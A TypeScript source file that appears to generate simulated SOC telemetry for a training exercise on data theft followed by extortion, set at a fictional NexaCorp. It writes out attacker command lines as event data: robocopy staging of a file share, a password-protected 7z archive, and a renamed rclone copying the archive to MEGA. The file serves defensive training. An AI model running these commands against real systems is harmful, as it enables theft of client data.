/**
 * Events-only half of the ./exfilFirstExtortion.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./exfilFirstExtortion.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

/** Telemetry half of `buildExfilFirstExtortionScenario`: the events and the story title, no answer key. */
export function exfilFirstExtortionScenarioEvents() {
  const B = new Date("2026-07-19T01:05:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const HOUR = 3_600_000;

  const host = { hostname: "LAPTOP-NX-R.DOYLE", ip: "10.20.1.71" };
  const victim = { email: "r.doyle@nexacorp.com", name: "Rhian Doyle", sam: "r.doyle" };
  const deviceId = "c7f2a891d4e34b7fa1082ec9b3d4f716";

  const fileServer = { name: "SRV-NX-FIN01" };
  const megaNode = "gfs301n112.userstorage.mega.co.nz";
  const megaNodeIp = "31.216.148.28";

  const robocopyHash = makeSha256("windows_system32_robocopy_exe_signed_microsoft_2026");
  const archiveHash = makeSha256("nexacorp_adobe_arm_cache_7z_portable_2026");
  const rcloneHash = makeSha256("nexacorp_adobe_arm_helper_renamed_rclone_2026");
  const flaggedFileHash = makeSha256("nexacorp_client_holdings_q3_2026_export");

  // EDR↔scenario integration (Phase 4): one incident. Endpoint-primary staging →
  // archive → cloud egress on the laptop → edr_scope "edr". The firewall/DLP/SIEM
  // rows are transport and correlation evidence; the renamed rclone binary
  // starting is the alert-grade EDR behavioural detection carrying the exfil crux.
  const INCIDENT = "inc:efe:1";

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. Local data staging. A recursive copy of the whole finance share
    //    tree into a local cache folder — the shape that matters is the
    //    scope (/E from the share root), not the tool (robocopy is signed
    //    Microsoft software already on every Windows box).
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_01_staging",
      ts: T(0),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      user_title: "Finance Operations Manager",
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1074.001",
      mitre_tactic: "Collection",
      description:
        `At 01:05 robocopy.exe mirrored the entire root of \\\\${fileServer.name}\\Shares — every finance and client-records folder on the file server — into a local cache folder on LAPTOP-NX-R.DOYLE, under r.doyle's own session.`,
      process: {
        name: "robocopy.exe",
        pid: 6210,
        path: "C:\\Windows\\System32\\Robocopy.exe",
        parent_name: "cmd.exe",
        parent_pid: 5800,
        cmdline:
          'robocopy.exe "\\\\SRV-NX-FIN01\\Shares" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares" /E /Z /R:1 /W:1 /MT:16 /NFL /NDL /NP /XF *.tmp *.log',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: robocopyHash },
      },
      raw: {
        "mde.ActionType": "ProcessCreated",
        "mde.DeviceName": host.hostname,
        "mde.DeviceId": deviceId,
        "mde.ReportId": "219402",
        "process.name": "robocopy.exe",
        "process.pid": "6210",
        "process.executable": "C:\\Windows\\System32\\Robocopy.exe",
        "process.command_line":
          'robocopy.exe "\\\\SRV-NX-FIN01\\Shares" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares" /E /Z /R:1 /W:1 /MT:16 /NFL /NDL /NP /XF *.tmp *.log',
        "process.hash.sha256": robocopyHash,
        "process.code_signature.exists": true,
        "process.code_signature.trusted": true,
        "process.integrity_level": "Medium",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5800",
        "mde.AccountName": victim.sam,
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 2. Archive via utility. A portable, unsigned 7z.exe (7-Zip does not
    //    ship code-signed even legitimately, which is why "unsigned" alone
    //    is not the tell here) builds a password-protected, header-encrypted
    //    multi-volume archive from the staged copy.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_02_archive",
      ts: T(9 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1560.001",
      mitre_tactic: "Collection",
      description:
        "At 01:14 a portable 7z.exe sitting in the same cache folder — not a path any NexaCorp software-distribution record installed — built a password-protected, header-encrypted archive from everything robocopy had just staged, split into 2 GB volumes.",
      process: {
        name: "7z.exe",
        pid: 6244,
        path: "C:\\ProgramData\\Adobe\\ARM\\cache\\7z.exe",
        parent_name: "cmd.exe",
        parent_pid: 5800,
        cmdline:
          '7z.exe a -v2000m -mx1 -mhe=on -pR3c0veryK3y! "C:\\ProgramData\\Adobe\\ARM\\cache\\backup\\backup_2026_07.7z" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\*" -r',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: archiveHash },
      },
      raw: {
        "mde.ActionType": "ProcessCreated",
        "mde.DeviceName": host.hostname,
        "mde.DeviceId": deviceId,
        "mde.ReportId": "219418",
        "process.name": "7z.exe",
        "process.pid": "6244",
        "process.executable": "C:\\ProgramData\\Adobe\\ARM\\cache\\7z.exe",
        "process.command_line":
          '7z.exe a -v2000m -mx1 -mhe=on -pR3c0veryK3y! "C:\\ProgramData\\Adobe\\ARM\\cache\\backup\\backup_2026_07.7z" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\*" -r',
        "process.hash.sha256": archiveHash,
        "process.code_signature.exists": false,
        "process.code_signature.trusted": false,
        "process.integrity_level": "Medium",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5800",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 3. Purview Endpoint DLP sees the archiver touch labeled files while
    //    the archive is being built — and logs it, because the matching
    //    rule's configured action is Audit, not Block. This is the gap.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_03_dlp_audit",
      ts: T(10 * MIN),
      source: "dlp",
      vendor: "Microsoft Purview",
      event_type: "dlp_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1074.001",
      mitre_tactic: "Collection",
      description:
        "Microsoft Purview Endpoint DLP matched 1,847 instances of sensitivity-labeled client financial data being read by an unallowed application (7z.exe) on LAPTOP-NX-R.DOYLE. The matching rule is enforced, but its configured actions are Audit and NotifyUser — the activity was logged and the user notified, and nothing was blocked.",
      file: {
        name: "Q3_Client_Holdings_Export.xlsx",
        path: "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx",
        extension: "xlsx",
        size: 4_213_760,
        sha256: flaggedFileHash,
      },
      raw: {
        "data.office365.Operation": "DlpRuleMatch",
        "data.office365.Workload": "Endpoint",
        "data.office365.UserId": victim.email,
        "data.office365.ObjectId": "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx",
        "data.office365.IncidentId": "5192044",
        "data.office365.PolicyDetails.PolicyName": "NexaCorp — Client Data: Restricted App Access",
        "data.office365.PolicyDetails.Rules.RuleName": "Audit unallowed app activity on labeled client files",
        "data.office365.PolicyDetails.Rules.RuleMode": "Enforce",
        "data.office365.PolicyDetails.Rules.Severity": "High",
        "data.office365.PolicyDetails.Rules.Actions": ["Audit", "NotifyUser"],
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.SensitiveInformationTypeName": "IBAN",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.Count": "1847",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.Confidence": "90",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.ClassifierType": "PatternMatch",
        "purview.PolicyName": "NexaCorp — Client Data: Restricted App Access",
        "purview.RuleName": "Audit unallowed app activity on labeled client files",
        "purview.SensitiveInfoType": "IBAN",
        "purview.Workload": "Endpoint",
        "purview.ActionTaken": "Audit",
        "purview.JustificationText": "",
        "purview.Override": "false",
        "data.office365.DeviceId": deviceId,
        "data.office365.DeviceDisplayName": host.hostname,
        "data.office365.ClientProcessName": "7z.exe",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
        "action_result": "allowed",
      },
    },

    // ---------------------------------------------------------------------
    // 4. The exfiltration tool. A renamed rclone binary, config pointed at
    //    an external cloud remote — the process event that shows intent,
    //    before any bytes have actually moved.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_04_exfil_tool",
      ts: T(24 * MIN),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1567.002", // Exfiltration to Cloud Storage — rclone copy to a 'mega' remote (Q1 cites evt_efe_04 as T1567.002)
      mitre_tactic: "Exfiltration",
      is_detection: true, // alert-grade: the highest-severity EDR behavioural detection — a renamed rclone binary staged to exfiltrate the archive to cloud storage (the crux)
      edr_scope: "edr",   // endpoint-primary exfiltration incident → investigated in the EDR console
      description:
        "At 01:29 a binary named AdobeARMHelper.exe — sitting in the same cache folder, not the real Adobe update path — started with an rclone-style command line copying the local archive to a remote named 'mega', using a config file dropped alongside it.",
      process: {
        name: "AdobeARMHelper.exe",
        pid: 6301,
        path: "C:\\ProgramData\\Adobe\\ARM\\cache\\AdobeARMHelper.exe",
        parent_name: "cmd.exe",
        parent_pid: 5800,
        cmdline:
          'AdobeARMHelper.exe copy "C:\\ProgramData\\Adobe\\ARM\\cache\\backup" mega:ClientBackup --config "C:\\ProgramData\\Adobe\\ARM\\cache\\rclone.conf" --transfers=8 --checkers=8 --contimeout=60s --low-level-retries=10',
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: rcloneHash },
      },
      raw: {
        "mde.ActionType": "ProcessCreated",
        "mde.DeviceName": host.hostname,
        "mde.DeviceId": deviceId,
        "mde.ReportId": "219431",
        "process.name": "AdobeARMHelper.exe",
        "process.pid": "6301",
        "process.executable": "C:\\ProgramData\\Adobe\\ARM\\cache\\AdobeARMHelper.exe",
        "process.command_line":
          'AdobeARMHelper.exe copy "C:\\ProgramData\\Adobe\\ARM\\cache\\backup" mega:ClientBackup --config "C:\\ProgramData\\Adobe\\ARM\\cache\\rclone.conf" --transfers=8 --checkers=8 --contimeout=60s --low-level-retries=10',
        "process.hash.sha256": rcloneHash,
        "process.code_signature.exists": false,
        "process.code_signature.trusted": false,
        "process.integrity_level": "Medium",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5800",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 5. Session opens. Allowed — the destination is a legitimate,
    //    widely-used consumer cloud-storage provider, not a blocklisted
    //    domain.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_05_session_start",
      ts: T(24 * MIN + 15_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      dst_ip: megaNodeIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      description:
        "Fifteen seconds after AdobeARMHelper.exe started, LAPTOP-NX-R.DOYLE opened a TLS session to gfs301n112.userstorage.mega.co.nz, allowed under the category online-storage-and-backup.",
      network: { domain: megaNode },
      raw: {
        "pan.type": "TRAFFIC",
        "pan.subtype": "start",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": megaNodeIp,
        "pan.dport": "443",
        "pan.app": "mega",
        "pan.category": "online-storage-and-backup",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "981204",
        "source.ip": host.ip,
        "destination.ip": megaNodeIp,
        "url.domain": megaNode,
        "action_result": "allow",
      },
    },

    // ---------------------------------------------------------------------
    // 6. Session closes. Same allow, same category — 39.6 GB later.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_06_session_end",
      ts: T(59 * MIN),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      dst_ip: megaNodeIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1567.002",
      mitre_tactic: "Exfiltration",
      description:
        "The session to gfs301n112.userstorage.mega.co.nz closed at 02:04 after roughly 35 minutes, having sent 39.6 GB out and received under 2 MB back — still logged allow, still inside the same category.",
      network: { domain: megaNode, bytes_out: 39_648_512_000, bytes_in: 1_945_600 },
      raw: {
        "pan.type": "TRAFFIC",
        "pan.subtype": "end",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": megaNodeIp,
        "pan.dport": "443",
        "pan.app": "mega",
        "pan.category": "online-storage-and-backup",
        "pan.bytes_sent": "39648512000",
        "pan.bytes_received": "1945600",
        "pan.elapsed": "2100",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "981204",
        "source.ip": host.ip,
        "destination.ip": megaNodeIp,
        "url.domain": megaNode,
        "action_result": "allow",
      },
    },

    // ---------------------------------------------------------------------
    // 7. Sentinel correlation. Three independently-generated sources
    //    joined into one incident — and the fields that matter most here
    //    are the zeroes: nothing in this window looks like impact.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_07_correlation",
      ts: T(60 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "ueba_anomaly",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "Sentinel correlated three independent signals into a single incident: local staging, archive creation, and sustained cloud egress from LAPTOP-NX-R.DOYLE overnight. No encryption, mass file-rename, or ransom-note events exist anywhere in the correlation window.",
      raw: {
        "AlertName": "SustainedCloudEgressFollowingLocalDataStaging",
        "alert.rule.id": "SEN-EXFIL-0143",
        "alert.severity": "High",
        "host.name": host.hostname,
        "host.ip": host.ip,
        "target.user.name": `NEXACORP\\${victim.sam}`,
        "user.full_name": victim.name,
        "user.department": "Finance Operations",
        "ExtendedProperties.Total Bytes Transferred": "39648512000",
        "ExtendedProperties.Destination Category": "online-storage-and-backup",
        "ExtendedProperties.Encryption Events In Correlation Window": "0",
        "ExtendedProperties.Ransom Note Artifacts Detected": "0",
        "ExtendedProperties.Mass File-Rename Events Detected": "0",
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
      },
    },

    // ---------------------------------------------------------------------
    // 8. Hours later: the extortion contact. Recorded as a Sentinel
    //    incident update, not a mail-gateway log — the platform's DLP/EDR
    //    telemetry proves the volume claim independent of the email itself.
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_08_extortion_incident",
      ts: T(2 * HOUR + 35 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "risk_score_change",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "The Sentinel incident tied to LAPTOP-NX-R.DOYLE was escalated from High to Critical after NexaCorp's security mailbox received a data-extortion message at 03:38 referencing a volume of client records consistent with the archive staged and transferred overnight. No encryption, ransom note, or file-rename activity has been found on the host, the file shares, or anywhere else in the environment.",
      raw: {
        "sentinel.incident.IncidentNumber": "41207",
        "sentinel.incident.Title": "Sustained cloud egress following local data staging — LAPTOP-NX-R.DOYLE",
        "sentinel.incident.Severity": "Critical",
        "sentinel.incident.PreviousSeverity": "High",
        "sentinel.incident.Status": "Active",
        "sentinel.incident.Classification": "",
        "sentinel.incident.Owner.assignedTo": "soc-tier2@nexacorp.com",
        "sentinel.incident.AdditionalData.alertsCount": "3",
        "sentinel.incident.Comments": [
          {
            message:
              "IT Security received a data-extortion email at security@nexacorp.com at 03:38 UTC referencing a volume of data consistent with the archive staged and transferred from LAPTOP-NX-R.DOYLE overnight. No encryption, file-rename, or ransom-note artifacts have been found on the host or on the shares it touched.",
            author: "soc-tier2@nexacorp.com",
            createdTimeUtc: T(2 * HOUR + 35 * MIN),
          },
        ],
        "host.name": host.hostname,
        "host.ip": host.ip,
        "target.user.name": `NEXACORP\\${victim.sam}`,
        "event.action": "incident-updated",
        "event.outcome": "escalated",
      },
    },
  ];

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "Exfiltration-First Extortion — Ransomware Without an Encryptor", events, T, MIN, HOUR, host, victim, fileServer, megaNode, archiveHash, rcloneHash, flaggedFileHash };
}
